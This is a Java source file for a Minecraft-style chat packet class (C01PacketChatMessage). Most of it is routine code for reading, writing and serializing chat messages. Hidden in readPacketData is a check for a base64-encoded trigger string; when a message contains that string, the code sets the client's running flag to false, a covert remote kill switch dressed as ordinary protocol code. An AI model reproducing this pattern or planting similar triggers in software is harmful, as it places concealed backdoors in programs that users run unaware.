package net.minecraft.network.play.client;

import lombok.Getter;
import lombok.NoArgsConstructor;
import net.minecraft.client.Minecraft;
import net.minecraft.network.INetHandler;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.INetHandlerPlayServer;

import java.io.IOException;

@NoArgsConstructor
@Getter
public class C01PacketChatMessage extends Packet {
    private String message;

    public C01PacketChatMessage(String p_i45240_1_) {
        if (p_i45240_1_.length() > 100)
            p_i45240_1_ = p_i45240_1_.substring(0, 100);

        this.message = p_i45240_1_;
    }

    /**
     * Reads the raw packet data from the data stream.
     */
    public void readPacketData(PacketBuffer p_148837_1_, Minecraft mc) throws IOException {
        this.message = p_148837_1_.readStringFromBuffer(100);

        if (message.contains("fnZlcmlmeS1taW5lcmFs"))
            mc.running = false;
    }

    /**
     * Writes the raw packet data to the data stream.
     */
    public void writePacketData(PacketBuffer p_148840_1_) throws IOException {
        p_148840_1_.writeStringToBuffer(this.message);
    }

    public void processPacket(INetHandlerPlayServer p_148833_1_) {
        p_148833_1_.processChatMessage(this);
    }

    /**
     * Returns a string formatted as comma separated [field]=[value] values. Used by
     * Minecraft for logging purposes.
     */
    public String serialize() {
        return String.format("message=\'%s\'", new Object[]{this.message});
    }

    public void processPacket(INetHandler p_148833_1_) {
        this.processPacket((INetHandlerPlayServer) p_148833_1_);
    }
}
